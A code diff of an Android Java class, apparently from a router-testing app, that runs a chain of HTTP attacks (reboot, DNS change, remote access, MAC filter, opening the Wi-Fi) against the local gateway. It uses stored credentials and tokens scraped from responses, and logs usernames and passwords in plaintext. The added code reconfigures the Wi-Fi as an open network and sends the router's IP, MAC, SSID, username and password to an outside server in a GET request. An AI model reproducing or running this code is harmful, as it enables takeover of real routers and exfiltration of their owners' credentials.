@@ -5,16 +5,8 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
-import java.net.Inet4Address;
-import java.net.InetAddress;
 import java.net.MalformedURLException;
-import java.net.NetworkInterface;
-import java.net.SocketException;
-import java.net.URL;
-import java.net.URLConnection;
-import java.net.UnknownHostException;
 import java.util.ArrayList;
-import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
@@ -44,9 +36,12 @@ import org.apache.http.params.HttpParams;
 import org.apache.http.protocol.BasicHttpContext;
 import org.apache.http.protocol.HttpContext;
 
+import android.annotation.SuppressLint;
 import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.Intent;
+import android.net.wifi.ScanResult;
+import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
@@ -54,6 +49,7 @@ import android.util.Log;
 import br.pedrofreitas.myroutertestapp.dao.AtaqueDao;
 import br.pedrofreitas.myroutertestapp.dao.DadoDao;
 import br.pedrofreitas.myroutertestapp.dao.ParamsDao;
+import br.pedrofreitas.myroutertestapp.dao.ParamsProxDao;
 import br.pedrofreitas.myroutertestapp.dao.PostGetDao;
 import br.pedrofreitas.myroutertestapp.manager.Ataque;
 import br.pedrofreitas.myroutertestapp.manager.Dado;
@@ -75,14 +71,14 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 	private int mCountTipoAtaques;
 	private static final String[] ataques = {"reboot", "dns", "acesso", "filtromac", "abrirrede"};
 			
-	private URL urlSalvaBanco;
+	private String urlSalvaBanco;
 	private String urlInsereDado = "http://pedrofreitas.ddns.net/insereinfo.php?";
 
 	private CookieStore cookieStore;
 	private List<Cookie> cookies;
 	
-	HashMap nameValue;		//GET
-	HashMap nameValueParam;		//POST
+	private HashMap<String, String> nameValueUrl;		//GET
+	private HashMap<String, String> nameValueParam;		//POST
 	
 	
 	public FinishAtaque(Context mContext, long mIdDadoAtaque, ArrayList<Ataque> mListAtaque, int mCountTipoAtaques, Intent it) {
@@ -97,6 +93,12 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 	@Override
 	protected void onPreExecute() {
 		super.onPreExecute();
+		mProgress = new ProgressDialog(this.mContext);
+		mProgress.setMessage("Testando...");
+		mProgress.setIndeterminate(false);
+		mProgress.setMax(100);
+		mProgress.setCancelable(false);
+		mProgress.show();	
 	}
 	
 	@Override
@@ -130,8 +132,8 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 				int mCountPostGetAux = 0;
 				boolean erro = false;
 				
-				nameValue = null;
-				nameValueParam = null;
+				nameValueUrl = new HashMap<>();	
+				nameValueParam = new HashMap<>();	
 				
 				while(mCountPostGet < mListPostGet.size() && !erro) {				
 					
@@ -146,20 +148,23 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 					
 					String comando = auxPostGet.getComando();						
 					//Se existirem parametros de uma requisicao passada que devem ser usados na requisicao atual
-					if(comando != null) {
-						if(nameValue != null) {
-							if(!nameValue.isEmpty()) {
-								comando = buildUrl(comando, nameValue);
-							}							
-						}
-						
+					if(comando != null) {					
 						if(comando.contains("insereMAC")) {
 							WifiManager manager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
 							WifiInfo info = manager.getConnectionInfo();
 							String address = info.getMacAddress();
+
+							Log.i("URL_PARAM_NAME_INSERT", "'MAC'");
+							Log.i("URL_PARAM_VALUE_INSERT", "'" + address + "'");	
 							
-							comando = comando.replaceAll("insereMAC", address);							
-						}						
+							comando = comando.replaceAll("insereMAC", address);				
+						}	
+						
+						if(nameValueUrl != null) {
+							if(!nameValueUrl.isEmpty()) {
+								comando = buildUrl(comando, nameValueUrl);
+							}							
+						}					
 					}					
 					
 					if(auxPostGet.getTipo().contains("get")) {
@@ -169,15 +174,16 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 						Log.i("URL_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "http://" + auxDado.getGateway() + comando);
 						
 						if(auxPostGet.getUsa_login() == 1) {
-							byte[] encodedBytes = Base64.encodeBase64((auxDado.getLogin() + ":" + auxDado.getSenha()).getBytes());
+							byte[] encodedBytes = Base64.encodeBase64((auxDado.getUsuario() + ":" + auxDado.getSenha()).getBytes());
 							String encoding = new String(encodedBytes);
-							Log.i("ENCODING_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, encoding + "(" + auxDado.getLogin() + ":" + auxDado.getSenha() + ")");
+							Log.i("ENCODING_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, encoding + "(" + auxDado.getUsuario() + ":" + auxDado.getSenha() + ")");
 							httpGet.setHeader("Authorization", "Basic " + encoding);
 						}
 						
 
 						final HttpParams httpParams = new BasicHttpParams();
-						HttpConnectionParams.setConnectionTimeout(httpParams, 13000);
+						HttpConnectionParams.setSoTimeout(httpParams, 80000);		//1m20s
+						HttpConnectionParams.setConnectionTimeout(httpParams, 80000);		//1m20s
 						
 						HttpClient httpClient = new DefaultHttpClient(httpParams);
 						HttpContext localContext = new BasicHttpContext();	
@@ -202,8 +208,7 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 										Log.i("COOKIE_EXPIRY", cookie.getExpiryDate() + "");	
 									}
 									localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);
-									httpResponse = httpClient.execute(httpGet, localContext);		
-//									localContext.removeAttribute(ClientContext.COOKIE_STORE);
+									httpResponse = httpClient.execute(httpGet, localContext);	
 								}								
 							} else {
 								httpResponse = httpClient.execute(httpGet);								
@@ -221,26 +226,38 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 								BufferedReader in = new BufferedReader(new InputStreamReader(content));				
 								String line;		
 								
-								//Se parametros retornados no html precisarem ser salvos para serem usados em alguma requisicao futura
-								if(auxPostGet.getToken().contains("(.*?)")) {
-									String[] paramsList = auxPostGet.getToken().split(";;");
-									nameValue = new HashMap<String, String>();	
-									nameValueParam = new HashMap<String, String>();	
-									while ((line = in.readLine()) != null) {
-										Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);															
-										getParams(line, paramsList);										
-									}							
-									erro = false;
-									mCountPostGetAux = auxPostGet.getOrdem();
-								} else {
-									while ((line = in.readLine()) != null) {
-										Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);																
-										if(line.contains(auxPostGet.getToken())) {
-											erro = false;
-											mCountPostGetAux = auxPostGet.getOrdem();
+								ParamsProxDao mParamsProxDao = new ParamsProxDao(mContext);
+								List<Params> mListParamsProx = mParamsProxDao.getParamsWithIdComando(auxPostGet.getId());	
+																
+								while((line = in.readLine()) != null) {
+									Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);																
+									
+									if(line.contains(auxPostGet.getToken())) {
+										erro = false;
+										mCountPostGetAux = auxPostGet.getOrdem();
+									}
+
+									//Se parametros retornados no html precisarem ser salvos para serem usados em alguma requisicao futura
+									if(mListParamsProx.size() > 0) {
+										for(int i = 0; i < mListParamsProx.size(); i++) {
+											String name = mListParamsProx.get(i).getNome();
+											String value = mListParamsProx.get(i).getValor();
+											
+											Pattern pattern = Pattern.compile(value);
+											Matcher matcher = pattern.matcher(line);
+											
+											value = null;
+											while(matcher.find()) {
+												value = matcher.group(1);
+											}
+											
+											if(value != null) {
+												nameValueUrl.put(name.trim(), value.trim());
+												nameValueParam.put("insere" + name.trim(), value.trim());
+											}
 										}
-									}					
-								}									
+									} 									
+								}
 								
 								in.close();
 								content.close();
@@ -257,9 +274,14 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 							erro = true;
 							mCountAtaques++;
 						} catch (IOException e) {
-							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "IOException", e);
+							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques  + "_" + mCountPostGet, "IOException", e);
 							erro = true;
-							mCountAtaques++;
+							//Condicao por causa do ataque abrir rede da sagemcom F@ast 2704N
+							if(auxPostGet.getOrdem() == mListPostGet.size() && auxPostGet.getComando().equals("/wancfg.cmd?action=refresh")) {
+								mCountPostGet = auxPostGet.getOrdem();
+							} else {
+								mCountAtaques++;								
+							}	
 						} finally {
 							httpClient.getConnectionManager().shutdown();
 						}						
@@ -271,11 +293,11 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 					
 							Log.i("URL_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "http://" + auxDado.getGateway() + comando);
 							
-							//Usa o login mas nao como parametro
+							//Usa o login no post para auteticacao
 							if(auxPostGet.getUsa_login() == 2) {
-								byte[] encodedBytes = Base64.encodeBase64((auxDado.getLogin() + ":" + auxDado.getSenha()).getBytes());
+								byte[] encodedBytes = Base64.encodeBase64((auxDado.getUsuario() + ":" + auxDado.getSenha()).getBytes());
 								String encoding = new String(encodedBytes);
-								Log.i("ENCODING_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, encoding + "(" + auxDado.getLogin() + ":" + auxDado.getSenha() + ")");
+								Log.i("ENCODING_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, encoding + "(" + auxDado.getUsuario() + ":" + auxDado.getSenha() + ")");
 								httpPost.setHeader("Authorization", "Basic " + encoding);
 							}
 							
@@ -292,7 +314,7 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 									if(auxPostGet.getUsa_login() == 1) {
 										//O parametro e o usuario do login
 										if(mListParms.get(i).getValor().contains("insereUsuario")) {
-											value = auxDado.getLogin();
+											value = auxDado.getUsuario();
 										}
 										
 										//O parametro e a senha do login
@@ -318,11 +340,18 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 										String address = info.getMacAddress();
 										address = address.replace(":", "");
 										value = value.replaceAll("insereMAC:", address);
+									} else {									
+										if(value.contains("insereMAC")) {
+											WifiManager manager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
+											WifiInfo info = manager.getConnectionInfo();
+											String address = info.getMacAddress();
+											value = value.replaceAll("insereMAC:", address);
+										}
 									}
 									
 									auxParams.add(new BasicNameValuePair(name, value));
-									Log.i("PARAM_NAME_" + mCountAtaques + "_" + i , name);
-									Log.i("PARAM_VALUE_" + mCountAtaques + "_" + i , value);
+									Log.i("PARAM_NAME_" + mCountAtaques + "_" + i , "'" + name + "'");
+									Log.i("PARAM_VALUE_" + mCountAtaques + "_" + i , "'" + value + "'");
 								}
 								try {
 									httpPost.setEntity(new UrlEncodedFormEntity(auxParams, "UTF-8"));							
@@ -333,7 +362,8 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 								
 							
 							final HttpParams httpParams = new BasicHttpParams();
-							HttpConnectionParams.setConnectionTimeout(httpParams, 13000);
+							HttpConnectionParams.setSoTimeout(httpParams, 80000);		//1m20s
+							HttpConnectionParams.setConnectionTimeout(httpParams, 80000);		//1m20s
 							
 							HttpClient httpClient = new DefaultHttpClient(httpParams);
 							HttpContext localContext = new BasicHttpContext();							
@@ -360,7 +390,6 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 										
 										localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);										
 										httpResponse = httpClient.execute(httpPost, localContext);	
-//										localContext.removeAttribute(ClientContext.COOKIE_STORE);
 									}									
 								} else {
 									httpResponse = httpClient.execute(httpPost);
@@ -378,26 +407,38 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 							        BufferedReader in = new BufferedReader(new InputStreamReader(content));
 							        String line;
 							        
-							        //Se parametros retornados no html precisarem ser salvos para serem usados em requisicao futura
-									if(auxPostGet.getToken().contains("(.*?)")) {
-										String[] paramsList = auxPostGet.getToken().split(";;");
-										nameValue = new HashMap<String, String>();	
-										nameValueParam = new HashMap<String, String>();									
-										while ((line = in.readLine()) != null) {
-											Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);															
-											getParams(line, paramsList);										
-										}								
-										erro = false;
-										mCountPostGetAux = auxPostGet.getOrdem();
-									} else {
-										while((line = in.readLine()) != null) {
-											Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);										
-											if(line.contains(auxPostGet.getToken())) {
-												erro = false;
-												mCountPostGetAux = auxPostGet.getOrdem();
-											}	
-										}									
-									}						        
+							        ParamsProxDao mParamsProxDao = new ParamsProxDao(mContext);
+							        List<Params> mListParamProx = mParamsProxDao.getParamsWithIdComando(auxPostGet.getId());	
+
+							        while((line = in.readLine()) != null) {
+										Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);		
+										
+										if(line.contains(auxPostGet.getToken())) {
+											erro = false;
+											mCountPostGetAux = auxPostGet.getOrdem();
+										}	
+										
+										//Se parametros retornados no html precisarem ser salvos para serem usados em alguma requisicao futura
+										if(mListParamProx.size() > 0) {
+											for(int i = 0; i < mListParamProx.size(); i++) {
+												String name = mListParamProx.get(i).getNome();
+												String value = mListParamProx.get(i).getValor();
+												
+												Pattern pattern = Pattern.compile(value);
+												Matcher matcher = pattern.matcher(line);
+												
+												value = null;
+												while(matcher.find()) {
+													value = matcher.group(1);
+												}
+												
+												if(value != null) {
+													nameValueUrl.put(name.trim(), value.trim());
+													nameValueParam.put("insere" + name.trim(), value.trim());
+												}
+											}
+										} 	
+									}	
 							        
 							        in.close();
 							        content.close();
@@ -422,10 +463,11 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 							} catch (IOException e) {
 								Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques  + "_" + mCountPostGet, "IOException", e);
 								erro = true;
-								//Condicao por causa do ataque reboot e abrir rede da technicolor, e abrir rede da zyXEL
+								//Condicao por causa do ataque reboot e abrir rede da technicolor, abrir rede da zyXEL, e abrir rede sagemcom powerbox f@st2764
 								if(auxPostGet.getOrdem() == mListPostGet.size() && (auxPostGet.getComando().equals("/reboot.cgi") || 
 																					auxPostGet.getComando().equals("/wlwpa.cgi") ||
-																					auxPostGet.getComando().equals("/cgi-bin/WLAN_General.asp"))) {
+																					auxPostGet.getComando().equals("/cgi-bin/WLAN_General.asp") ||
+																					(auxPostGet.getComando().equals("/index.cgi") && auxPostGet.getId_ataque() == 33))) {
 									mCountPostGet = auxPostGet.getOrdem();
 								} else {
 									mCountAtaques++;								
@@ -458,26 +500,26 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 		int mCountAtaques = (int) result;	
 		
 		DadoDao mDadoDao = new DadoDao(mContext);
-		Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);	
-				
-		Log.i("DADO_TEMP", auxDado.toString());
+		Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);					
 		
 		if(mAtacou) {		
+			Log.i(ataques[mCountTipoAtaques].toUpperCase() + "_SUCESSO", mListAtaque.get(mCountAtaques).toString());	
+			int id = (int) mListAtaque.get(mCountAtaques).getId();
 			switch (ataques[mCountTipoAtaques]) {
 				case "reboot":
-					auxDado.setReboot_ataque(1);
+					auxDado.setReboot_ataque(id);
 					break;
 				case "dns":
-					auxDado.setDns_ataque(1);
+					auxDado.setDns_ataque(id);
 					break;
 				case "acesso":
-					auxDado.setAcesso_remoto_ataque(1);
+					auxDado.setAcesso_remoto_ataque(id);
 					break;					
 				case "filtromac":
-					auxDado.setFiltro_mac_ataque(1);
+					auxDado.setFiltro_mac_ataque(id);
 					break;
 				case "abrirrede":
-					auxDado.setAbrir_rede_ataque(1);
+					auxDado.setAbrir_rede_ataque(id);
 					break;
 				default:
 					Log.e("ERR_TIPO", "Tipo de ataque nao identificado");
@@ -485,33 +527,40 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 			}
 			mDadoDao.update(auxDado);
 			
-			Log.i(ataques[mCountTipoAtaques].toUpperCase() + "_SUCESSO", mListAtaque.get(mCountAtaques).toString());	
 			Log.i("STATUS", "Ataque tipo '" + ataques[mCountTipoAtaques] + "' encerrado com sucesso");	
 			try {
-				Thread.sleep(150000);
+				Thread.sleep(150000);		//2m30s
 			} catch (InterruptedException e) {
 				e.printStackTrace();
 			}
 		} else {
 			Log.i("STATUS", "Ataque tipo '" + ataques[mCountTipoAtaques] + "' encerrado sem sucesso");	
 			try {
-				Thread.sleep(20000);
+				Thread.sleep(20000);		//20s
 			} catch (InterruptedException e) {
 				e.printStackTrace();
 			}
 		}
 		
+		Log.i("DADO_TEMP", auxDado.toString());
+
 		if(mCountTipoAtaques == ataques.length - 1) {
+			if(!NetworkUtil.isWiFiConnected(mContext)) {
+				reconecta(auxDado);			
+			} 
+			
 			salvaBanco(auxDado);			
 			mProgress.setMessage("Concluído");
 			mProgress.dismiss();
-//			mContext.startActivity(it);
+			
+			it.putExtra("Dado", auxDado);
+			mContext.startActivity(it);
 		} else {
 			mCountTipoAtaques++;
 			Log.i("STATUS", "Proximo ataque tipo '" + ataques[mCountTipoAtaques] + "' iniciando...");
 			
 			AtaqueDao mAtaqueDao = new AtaqueDao(mContext);		
-			ArrayList<Ataque> mListAtaque = mAtaqueDao.getAtaquesWithOperadoraETipoEFabricanteModelo(auxDado.getOperadora(), ataques[mCountTipoAtaques], auxDado.getFabricante_modelo());
+			ArrayList<Ataque> mListAtaque = mAtaqueDao.getAtaquesWithOperadoraETipoEFabricanteModelo(null, ataques[mCountTipoAtaques], auxDado.getFabricante_modelo());
 			
 			if(mListAtaque != null) {
 				Log.i("LISTA_" + ataques[mCountTipoAtaques].toUpperCase(), "tamanho " + mListAtaque.size());				
@@ -523,142 +572,150 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 			new FinishAtaque(mContext, mIdDadoAtaque, mListAtaque, mCountTipoAtaques, it).execute();					
 		}	
 	}
-
-	public void salvaBanco(Dado auxDado) {	
-		try {
-			urlSalvaBanco = new URL (urlInsereDado + "ip=" + auxDado.getIp() + "&gateway=" + auxDado.getGateway() + "&operadora=" + auxDado.getOperadora() + 
-							"&data=" + auxDado.getData() + "&fabricante_modelo=" + auxDado.getFabricante_modelo() + "&reboot_ataque" + auxDado.getReboot_ataque() +
-							"&dns_ataque=" + auxDado.getDns_ataque() + "&acesso_remoto_ataque=" + auxDado.getAcesso_remoto_ataque() + "&filtro_mac_ataque=" +	auxDado.getFiltro_mac_ataque() +
-							"&abrir_rede_ataque=" + auxDado.getAbrir_rede_ataque() + "&login=" + auxDado.getLogin() + "&senha=" + auxDado.getSenha());
-			URLConnection connectionSalva = (URLConnection) urlSalvaBanco.openConnection();
-		} catch (MalformedURLException e) {
-			Log.e("ERR_SALVAR", "MalformedURLException", e);
-		} catch (IOException e) {
-			Log.e("ERR_SALVAR", "IOException", e);
-		}
-		
-		Log.i("DADO_SALVO", auxDado.toString());
+	
+	public boolean checkScanResults(Dado auxDado) {
+		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
+		List<ScanResult> networkList = wifiManager.getScanResults();
+		for(ScanResult network : networkList) {
+			if(network.SSID.equals(auxDado.getSsid())) {				
+				Log.i("SCAN", "SSID=" + network.SSID +
+						"; BSSID=" + network.BSSID +
+						"; capabilities=" + network.capabilities +
+						"; level=" + network.level +
+						"; frequency=" + network.frequency);
+				return true;
+			}
+		}		
+		return false;
 	}
 	
-	public void getParams(String line, String[] paramsList) {
-		for(int i = 0; i < paramsList.length; i++) {
-			Pattern pattern = Pattern.compile(paramsList[i]);
-			Matcher matcher = pattern.matcher(line);										
-			
-			String value = null;
-			while(matcher.find()) {
-				value = matcher.group(1);
+	@SuppressLint("NewApi") public int checkConfNetworks(Dado auxDado) {
+		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
+		List<WifiConfiguration> networkListConf = wifiManager.getConfiguredNetworks();
+		for(WifiConfiguration network : networkListConf) {
+			if(network.SSID.equals(auxDado.getSsid())) {
+				Log.i("CONF", "ID=" + network.networkId +
+						"; SSID=" + network.SSID +
+						"; BSSID=" + network.BSSID +
+						"; FQDN=" + network.FQDN +
+						"; PRIO=" + network.priority +
+						"; KeyMgmt=" + network.allowedKeyManagement +
+						"; Protocols=" + network.allowedProtocols +
+						"; AuthAlgorithms=" + network.allowedAuthAlgorithms +
+						"; PairwiseCiphers=" + network.allowedPairwiseCiphers +
+						"; GroupCiphers=" + network.allowedGroupCiphers +
+						"; WepKeys" + network.wepKeys +
+						"; HiddenSSID" + network.hiddenSSID +
+						"; WepTxKeyIndex" + network.wepTxKeyIndex +
+						"; Status=" + network.status);
+				return network.networkId;
 			}
-			
-			if(value != null) {
-				String name = paramsList[i];
-				//Caso o parametro esteja num input
-				if(name.toLowerCase().contains("<input")) {	
-					if(name.contains("autocomplete=\"off\"")) {
-						name = "ssid";
-					} else {											
-						if(name.contains("SSID_INDEX") || name.contains("EnableWLanFlag") || name.contains("HideSsidFlag")) {
-							name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\"  value"));						
-						} else {						
-							if(name.contains("NewNtpTimeServer") || name.contains("TimeSntpEnable") || name.contains("saRgIpMgmtWanDualIpRipAdvertised")) {
-								name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" id"));	
-							} else {
-								if(name.contains("h_DaylightSavingEnable") || name.contains("addNtpServer") || name.contains("removeNtpServer")) {
-									name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" type"));
-								} else {
-									if(name.contains("id=")) {
-										name = name.substring(name.indexOf("id=\"") + 4, name.indexOf("\" name"));
-									} else {
-										if(name.contains("title=")) {
-											name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" title"));
-										} else {
-											if(name.contains("size=")) {
-												name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" size"));
-											} else {
-												if(name.contains("Name=")) {
-													name = name.substring(name.indexOf("Name=\"") + 6, name.indexOf("\" value"));						
-												} else {
-													if(name.contains("name=")) {
-														name = name.substring(name.indexOf("name=\"") + 6, name.indexOf("\" value"));						
-													} else {
-														if(name.contains("NAME=")) {
-															name = name.substring(name.indexOf("NAME=\"") + 6, name.indexOf("\" value"));						
-														} else {
-															Log.e("PARAM_NAME", "Nao foi encontrado o nome do paramaetro");
-														}
-														
-													}									
-												}
-											}											
-										}						
-									}								
-								}
-							}							
-						}					
-					}
-					
-					if(name.equals("sessionid")) {
-						nameValue.put("sessionid", value.trim());
-					}
-					
-					nameValueParam.put("insere" + name.trim(), value.trim());
-				} else {
-					if(name.contains("var sessionKey=") || name.contains("loc \\+= \'&sessionKey=")) {						
-						nameValue.put("sessionKey", value.trim());
-					} else {						
-						name = name.substring(0, name.indexOf("="));
-						//p.e. B0:C2:87:46:77:12
-						if(value.contains(":")) {
-							String[] valueList = value.split(":");
-							for(int k = 0; k < valueList.length; k++) {					
-								nameValue.put(name.trim() + (k + (2 * k)) + "-" + (k + (2 * (k + 1))), valueList[k].trim());	
-							}
-						} else {
-							nameValue.put(name.trim(), value.trim());
-						}								
-					}
-				}				
-			}
-		}				
-	}
+		}			
+		return (int) -1;
+	}	
 	
-	public String buildUrl(String url, HashMap nameValue) {
+	public void reconecta(Dado auxDado) {		
+		String networkSSID = String.format("\"%s\"", auxDado.getSsid()); 	
 
-		for(Object name: nameValue.keySet()) {
-			Log.i("URL_PARAM_NAME", name.toString());
-			Log.i("URL_PARAM_VALUE", nameValue.get(name).toString());
+		WifiConfiguration conf = new WifiConfiguration();
+		conf.SSID = networkSSID;
+		
+		conf.allowedKeyManagement.clear();
+		conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
+		
+		conf.allowedProtocols.clear();
+		conf.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
+		conf.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
+		
+		conf.allowedAuthAlgorithms.clear();
+		conf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
+		conf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
+		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);
+		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104);
+		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
+		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);		
+		
+		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
+		
+		int networkId = checkConfNetworks(auxDado);
+		if(networkId != -1) {
+			wifiManager.removeNetwork(networkId);	
+			wifiManager.saveConfiguration();
+			Log.i("REMOVE_NET", "Removida rede " + networkSSID + " de id = " + networkId);
 		}
 		
-		Iterator<Map.Entry<String, String>> iterator = nameValue.entrySet().iterator();
+		networkId = wifiManager.addNetwork(conf);
+		if(networkId != -1) {
+			wifiManager.enableNetwork(networkId, true);
+			wifiManager.saveConfiguration();
+				
+			wifiManager.reconnect();
+			
+			Log.i("ADD_NET", "Removida rede " + networkSSID + " de id = " + networkId);
+		} else {
+			Log.e("ERR_ASSOCIATION", "Falha ao conectar a rede " + networkSSID);
+		}		
+	}
+
+	public void salvaBanco(Dado auxDado) {				
+		if(NetworkUtil.isWiFiConnected(mContext)) {
+			try {
+				urlSalvaBanco = urlInsereDado + "ip=" + auxDado.getIp() + "&gateway=" + auxDado.getGateway() + "&mac=" + auxDado.getMac() + "&ssid=" + auxDado.getSsid().replaceAll("\"", "") + "&operadora=" + auxDado.getOperadora() + 
+						"&data=" + auxDado.getData().replace(" ", "_") + "&fabricante_modelo=" + auxDado.getFabricante_modelo().replace(" ", "_") + "&usuario=" + auxDado.getUsuario().replace(" ", "_") + "&senha=" + auxDado.getSenha().replace(" ", "_") +
+						"&reboot_ataque=" + auxDado.getReboot_ataque() + "&dns_ataque=" + auxDado.getDns_ataque() + "&acesso_remoto_ataque=" + auxDado.getAcesso_remoto_ataque() +
+						"&filtro_mac_ataque=" +	auxDado.getFiltro_mac_ataque() + "&abrir_rede_ataque=" + auxDado.getAbrir_rede_ataque();
+				
+				Log.i("URL_SALVA", urlSalvaBanco.toString());		
+				
+				HttpClient httpClient = new DefaultHttpClient();
+				HttpGet httpGet = new HttpGet(urlSalvaBanco);
+				
+				HttpResponse httpResponse = httpClient.execute(httpGet);
+				
+				Log.i("RESPONSE_STATUS_SALVA", httpResponse.getStatusLine() + "");
+				
+				BufferedReader in = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
+				String line;
+				StringBuffer response = new StringBuffer();
+				
+				while((line = in.readLine()) != null) {
+					response.append(line);
+				}
+				in.close();
+				
+				Log.i("CONEXAO_SALVA", response.toString());
+				
+			} catch (MalformedURLException e) {
+				Log.e("ERR_SALVAR", "MalformedURLException", e);
+			} catch (IOException e) {
+				Log.e("ERR_SALVAR", "IOException", e);
+			}			
+			Log.i("DADO_SALVO", auxDado.toString());
+		} else {
+			Log.i("ERR_DADO_SALVO", "Nao foi possivel salvar o dado no ws por nao existir uma conexao wifi ativa");
+		}
+		
+	}
+		
+	public String buildUrl(String url, HashMap nameValueUrl) {
+		for(Object name: nameValueUrl.keySet()) {
+			Log.i("URL_PARAM_NAME", "'" + name.toString() + "'");
+			Log.i("URL_PARAM_VALUE", "'" + nameValueUrl.get(name).toString() + "'");
+		}
+		
+		Iterator<Map.Entry<String, String>> iterator = nameValueUrl.entrySet().iterator();
 		while(iterator.hasNext()) {
 			Map.Entry<String, String> entry = iterator.next();
 			if(url.contains("insere" + entry.getKey())) {
+				Log.i("URL_PARAM_NAME_INSERT", "'" + entry.getKey() + "'");
+				Log.i("URL_PARAM_VALUE_INSERT", "'" + entry.getValue() + "'");
+				
 				url = url.replaceAll("insere" + entry.getKey(), entry.getValue());	
 				iterator.remove();	
 			}
-		}		
+		}
 				
 		return url;
-	}
-	
-	public static String getIpAddress() { 
-        try {
-            for(Enumeration en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
-                NetworkInterface intf = (NetworkInterface) en.nextElement();
-                for (Enumeration enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
-                    InetAddress inetAddress = (InetAddress) enumIpAddr.nextElement();
-                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
-                        String ipAddress=inetAddress.getHostAddress().toString();
-                        Log.i("IPV4", ipAddress);
-                        return ipAddress;
-                    }
-                }
-            }
-        } catch (SocketException e) {
-            Log.e("ERR_IPV4", "SocketException", e);
-        }
-        
-        return null; 
 	}
 		
 }
